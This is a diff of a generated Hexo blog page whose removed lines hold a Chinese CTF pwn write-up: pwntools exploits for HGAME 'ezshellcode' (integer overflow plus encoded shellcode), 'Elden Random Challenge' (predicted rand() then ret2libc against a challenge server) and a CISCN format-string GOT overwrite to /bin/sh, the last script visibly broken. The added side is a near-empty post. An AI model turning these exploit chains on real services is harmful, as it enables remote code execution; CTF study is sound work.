@@ -4,10 +4,9 @@
 
 <head>
     <meta charset="utf-8">
-    <meta name="keywords" content="Hello World, Hexo">
-    <meta name="description" content="HGAME PWNezshellcode存在整数溢出，unsigned v4,输入-1，然后给一个shellcode
-找一个shellcode放里面
-shellcode来源：https://blog.csdn.net/mcmuyanga/a">
+    <meta name="keywords" content="Hexo">
+    <meta name="description" content="ff
+">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
     <meta name="renderer" content="webkit|ie-stand|ie-comp">
@@ -19,7 +18,7 @@ shellcode来源：https://blog.csdn.net/mcmuyanga/a">
     <!-- Global site tag (gtag.js) - Google Analytics -->
 
 
-    <title>Hello World | Hexo</title>
+    <title>Hexo</title>
     <link rel="icon" type="image/png" href="/favicon.png">
     
 
@@ -338,12 +337,12 @@ shellcode来源：https://blog.csdn.net/mcmuyanga/a">
 
 
 
-<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/12.jpg')">
+<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/0.jpg')">
     <div class="container" style="right: 0px;left: 0px;">
         <div class="row">
             <div class="col s12 m12 l12">
                 <div class="brand">
-                    <h1 class="description center-align post-title">Hello World</h1>
+                    <h1 class="description center-align post-title"></h1>
                 </div>
             </div>
         </div>
@@ -379,7 +378,7 @@ shellcode来源：https://blog.csdn.net/mcmuyanga/a">
                 
                 <div class="post-date info-break-policy">
                     <i class="far fa-calendar-minus fa-fw"></i>发布日期:&nbsp;&nbsp;
-                    2024-02-06
+                    2024-02-21
                 </div>
                 
 
@@ -388,7 +387,7 @@ shellcode来源：https://blog.csdn.net/mcmuyanga/a">
                 
                 <div class="info-break-policy">
                     <i class="far fa-file-word fa-fw"></i>文章字数:&nbsp;&nbsp;
-                    427
+                    1
                 </div>
                 
 
@@ -405,21 +404,8 @@ shellcode来源：https://blog.csdn.net/mcmuyanga/a">
 
         <div class="card-content article-card-content">
             <div id="articleContent">
-                <h1 id="HGAME-PWN"><a href="#HGAME-PWN" class="headerlink" title="HGAME PWN"></a>HGAME PWN</h1><h2 id="ezshellcode"><a href="#ezshellcode" class="headerlink" title="ezshellcode"></a>ezshellcode</h2><p>存在整数溢出，unsigned v4,输入-1，然后给一个shellcode</p>
-<p>找一个shellcode放里面</p>
-<p>shellcode来源：<a target="_blank" rel="noopener" href="https://blog.csdn.net/mcmuyanga/article/details/114828207">https://blog.csdn.net/mcmuyanga/article/details/114828207</a></p>
-<p>exp:</p>
-<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">from pwn import*</span><br><span class="line"></span><br><span class="line">context(log_level='debug',arch='amd64',os='linux')</span><br><span class="line">p=process('./ezshellcode')</span><br><span class="line"></span><br><span class="line">p.sendlineafter("of your shellcode:",b'-1')</span><br><span class="line"></span><br><span class="line">shellcode=b"Ph0666TY1131Xh333311k13XjiV11Hc1ZXYf1TqIHf9kDqW02DqX0D1Hu3M2G0Z2o4H</span><br><span class="line">0u0P160Z0g7O0Z0C100y5O3G020B2n060N4q0n2t0B0001010H3S2y0Y0O0n0z01340d2F4y8P115l1</span><br><span class="line">n0J0h0a070t"</span><br><span class="line"></span><br><span class="line">p.sendafter("input your shellcode:",shellcode)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></tbody></table></figure>
+                <h1 id="ff"><a href="#ff" class="headerlink" title="ff"></a>ff</h1><p><img src="/2024/02/21/2024.2/ff.1.png" alt="ff"></p>
 
-<h2 id="Elden-Random-Challenge"><a href="#Elden-Random-Challenge" class="headerlink" title="Elden Random Challenge"></a>Elden Random Challenge</h2><p>猜中99个随机数之后有个read的栈溢出，然后就是基础的ret2libc</p>
-<p>使用ctypes调用链接库的函数，通过创建cdll.LoadLibary来找出随机数</p>
-<p>进入myread函数之后通过read函数与动态链接库，写一个ret2libc</p>
-<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">from ctypes import *</span><br><span class="line"></span><br><span class="line">context(log_level='debug',os='linux',arch='amd64',terminal=['tmux','splitw','-h'])</span><br><span class="line"></span><br><span class="line">p = remote('106.14.57.14',30931)</span><br><span class="line"></span><br><span class="line">elf = ELF('./vuln')</span><br><span class="line">libc = cdll.LoadLibrary('./libc.so.6')</span><br><span class="line"></span><br><span class="line">libc.srand(0)  #找种子</span><br><span class="line"></span><br><span class="line">p.sendafter("thy name", b'a' * 0x12)</span><br><span class="line"></span><br><span class="line">for i in range(0,99):</span><br><span class="line">    m = libc.rand()%100+1</span><br><span class="line">    # print(m)</span><br><span class="line">    p.sendafter("guess the number:",p64(m)) </span><br><span class="line">    </span><br><span class="line">libc = ELF('./libc.so.6')</span><br><span class="line">puts_got = elf.got['puts']</span><br><span class="line">puts_plt = elf.plt['puts']</span><br><span class="line"></span><br><span class="line">pop_rdi = 0x401423</span><br><span class="line">ret = 0x40101A</span><br><span class="line"></span><br><span class="line">read = 0x401250 </span><br><span class="line"></span><br><span class="line">payload=b'a'*0x38</span><br><span class="line">payload+=p64(pop_rdi)</span><br><span class="line">payload+=p64(puts_got)</span><br><span class="line">payload+=p64(puts_plt)</span><br><span class="line">payload+=p64(read)</span><br><span class="line"></span><br><span class="line">p.sendafter("thy brilliant mind.",payload)</span><br><span class="line"></span><br><span class="line">libc_base=u64(p.recvuntil("\x7f")[-6:].ljust(8,b'\x00'))-libc.sym['puts']</span><br><span class="line">                 </span><br><span class="line"># print("libc_base=",hex(libc_base))</span><br><span class="line"></span><br><span class="line">payload=b'a'*0x38</span><br><span class="line">payload+=p64(ret)</span><br><span class="line">payload+=p64(pop_rdi)</span><br><span class="line">payload+=p64(libc_base+next(libc.search(b'/bin/sh')))</span><br><span class="line">payload+=p64(libc_base+libc.sym['system'])</span><br><span class="line"></span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></tbody></table></figure>
-
-<h1 id="CISCN-2019西南-PWN1"><a href="#CISCN-2019西南-PWN1" class="headerlink" title="[CISCN 2019西南]PWN1"></a>[CISCN 2019西南]PWN1</h1><p>hgame的fmt没打通，就又找了一道格式化字符串的题</p>
-<p>先gdb动调计算出偏移量4，找libc中的printf的got表，system的plt，加上个主函数</p>
-<p>修改fini，重新走一遍程序，使用fmtstr把system换上去</p>
-<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">context(log_level='debug',arch='i386', os='linux')</span><br><span class="line"></span><br><span class="line">p = process('./pwn')</span><br><span class="line">elf = ELF(pwn)</span><br><span class="line">#rop = ROP(pwn)</span><br><span class="line"></span><br><span class="line">libc =elf.libc</span><br><span class="line"></span><br><span class="line">io.recvuntil(b"your name?\n")</span><br><span class="line"></span><br><span class="line">fini = 0x0804979C  </span><br><span class="line">system_addr = elf.plt['system']</span><br><span class="line">printf_addr = elf.got['printf']</span><br><span class="line">main = elf.symbols['main']</span><br><span class="line"></span><br><span class="line">payload = fmtstr_payload(4, {fini :main , printf_addr:system_addr},write_size='short')#write_size有int short 跟byte</span><br><span class="line">print(payload)</span><br><span class="line"></span><br><span class="line">io.sendline(payload)</span><br><span class="line"></span><br><span class="line">io.recvuntil(b"What's your name?\n")</span><br><span class="line"></span><br><span class="line">io.sendline(b'/bin/sh\x00')</span><br><span class="line">io.interactive()</span><br></pre></td></tr></tbody></table></figure>
                 
             </div>
             <hr/>
@@ -445,7 +431,7 @@ shellcode来源：https://blog.csdn.net/mcmuyanga/a">
                     </i>
                 </span>
                 <span class="reprint-info">
-                    <a href="http://example.com/2024/02/06/week%202/">http://example.com/2024/02/06/week%202/</a>
+                    <a href="http://example.com/2024/02/21/2024.2.9/">http://example.com/2024/02/21/2024.2.9/</a>
                 </span>
             </div>
             <div class="reprint__notice">
@@ -558,7 +544,7 @@ shellcode来源：https://blog.csdn.net/mcmuyanga/a">
         repo: '',
         owner: '',
         admin: null,
-        id: '2024-02-06T23-12-15',
+        id: '2024-02-21T14-24-22',
         distractionFreeMode: false  // Facebook-like distraction free mode
     });
 
@@ -582,7 +568,7 @@ shellcode来源：https://blog.csdn.net/mcmuyanga/a">
 <script src="/libs/gitment/gitment.js"></script>
 <script>
 var gitment = new Gitment({
-    id: 'Tue Feb 06 2024 23:12:15 GMT+0800',
+    id: 'Wed Feb 21 2024 14:24:22 GMT+0800',
     owner: '',
     repo: '',
     oauth: {
@@ -607,9 +593,9 @@ gitment.render('gitment-content');
 
 <script type="text/javascript">
     disqus_config = function () {
-        this.page.url = 'http://example.com/2024/02/06/week%202/';
-        this.page.identifier = '/2024/02/06/week%202/';
-        this.page.title = 'Hello World';
+        this.page.url = 'http://example.com/2024/02/21/2024.2.9/';
+        this.page.identifier = '/2024/02/21/2024.2.9/';
+        this.page.title = '';
     };
     let disqus_shortname = '';
 
@@ -665,13 +651,13 @@ gitment.render('gitment-content');
             <div class="article-badge left-badge text-color">
                 <i class="fas fa-chevron-left"></i>&nbsp;上一篇</div>
             <div class="card">
-                <a href="/2024/02/21/2024.2.9/">
+                <a href="/2024/02/21/test/">
                     <div class="card-image">
                         
                         
-                        <img src="/medias/featureimages/0.jpg" class="responsive-img" alt="">
+                        <img src="/medias/featureimages/10.jpg" class="responsive-img" alt="test">
                         
-                        <span class="card-title"></span>
+                        <span class="card-title">test</span>
                     </div>
                 </a>
                 <div class="card-content article-content">
@@ -702,7 +688,7 @@ gitment.render('gitment-content');
                 下一篇&nbsp;<i class="fas fa-chevron-right"></i>
             </div>
             <div class="card">
-                <a href="/2024/02/06/hello-world/">
+                <a href="/2024/02/06/week%202/">
                     <div class="card-image">
                         
                         
